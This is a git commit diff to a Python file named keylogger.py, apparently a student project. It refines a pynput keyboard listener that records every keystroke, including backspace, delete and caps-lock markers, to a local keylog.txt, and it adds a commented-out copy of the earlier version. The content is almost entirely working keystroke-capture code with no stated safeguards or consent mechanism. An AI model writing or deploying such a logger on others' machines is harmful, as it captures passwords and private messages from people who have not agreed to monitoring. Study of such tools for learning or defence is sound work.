58766d462646a79112c61a1e4bc3b08452e7b49d
Dailion <i482276@fhict.nl>
2023-06-19 00:35:10 +0200

    .

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -1,3 +1,52 @@
+# from pynput import keyboard
+# import time
+
+# logfile = "keylog.txt"
+
+# def write_log(logfile, log):
+#     with open(logfile, "a") as writer:
+#         writer.write(log)
+
+# def on_press(key):
+#     try:
+#         log = ""
+#         if key == keyboard.Key.backspace:
+#             log = "[B]"
+#         elif key == keyboard.Key.enter:
+#             log = "\n"
+#         elif key == keyboard.Key.space:
+#             log = " "
+#         elif key == keyboard.Key.esc:
+#             log = "\n=========================================\nExiting"
+#             return False
+#         else:
+#             log = str(key).replace("'", "")
+
+#         write_log(logfile, log)
+
+#     except Exception as e:
+#         print("[ERROR] An error occurred:", str(e))
+
+# def on_release(key):
+#     if key == keyboard.Key.esc:
+#         print('Exiting...')
+#         return False
+
+# if __name__ == "__main__":
+#     print("[+] Keylogger started")
+#     curr_time = time.ctime(time.time())
+#     write_log(logfile, f"logs created on {curr_time}\n")
+#     write_log(logfile, "=========================================================\n")
+
+#     try:
+#         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+#             listener.join()
+#     except KeyboardInterrupt:
+#         print("[+] Exiting")
+
+
+
+
 from pynput import keyboard
 import time
 
@@ -11,7 +60,11 @@ def on_press(key):
     try:
         log = ""
         if key == keyboard.Key.backspace:
-            log = "[B]"
+            log = "[rm]"
+        elif key == keyboard.Key.delete:
+            log = "[del]"
+        elif key == keyboard.Key.caps_lock:
+            log = "[caps]"
         elif key == keyboard.Key.enter:
             log = "\n"
         elif key == keyboard.Key.space:
@@ -20,7 +73,7 @@ def on_press(key):
             log = "\n=========================================\nExiting"
             return False
         else:
-            log = str(key).replace("'", "")
+            log = str(key).replace("'", "").replace("Key.", "")
 
         write_log(logfile, log)
 
@@ -35,7 +88,7 @@ def on_release(key):
 if __name__ == "__main__":
     print("[+] Keylogger started")
     curr_time = time.ctime(time.time())
-    write_log(logfile, f"logs created on {curr_time}\n")
+    write_log(logfile, f"Logs created on {curr_time}\n")
     write_log(logfile, "=========================================================\n")
 
     try:
@@ -43,3 +96,6 @@ if __name__ == "__main__":
             listener.join()
     except KeyboardInterrupt:
         print("[+] Exiting")
+
+
+
